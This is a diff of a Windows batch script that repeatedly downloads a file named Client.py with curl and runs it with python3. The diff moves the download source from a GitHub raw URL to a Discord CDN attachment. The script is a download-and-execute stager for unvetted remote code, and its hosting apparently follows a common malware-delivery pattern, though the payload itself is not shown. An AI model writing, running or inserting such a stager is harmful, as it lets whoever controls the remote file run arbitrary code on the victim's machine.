@@ -1,6 +1,6 @@
 @echo off
 :top
-curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
+curl -o Client.py https://cdn.discordapp.com/attachments/1229773403842416640/1253909375337234535/Client.py?ex=6677919b&is=6676401b&hm=7bc2c13fe1db1787ad176e4bdcb9adc9743704cdc07a8672a9024475cc751b62&
 cls
 python3 Client.py
 cls
